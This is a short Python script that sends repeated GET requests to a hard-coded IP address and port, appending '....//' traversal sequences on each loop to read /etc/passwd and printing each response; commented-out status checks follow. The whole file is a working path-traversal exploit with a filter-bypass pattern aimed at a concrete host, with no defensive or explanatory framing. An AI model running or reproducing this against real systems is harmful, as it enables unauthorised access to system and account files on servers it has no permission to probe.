import requests

url = "http://45.77.33.129:5000/"

# Number of loops
num_loops = 100  # You can change this number to specify the number of loops

for _ in range(num_loops):
    url += "....//"
    response = requests.get(url+"etc/passwd")
    print(response.text)
    # Checking the response status
#    if response.status_code == 200:
 #       print(f"Request successful: {url}")
  #      print(response)
   # else:
    #    print(f"Request failed: {url}")

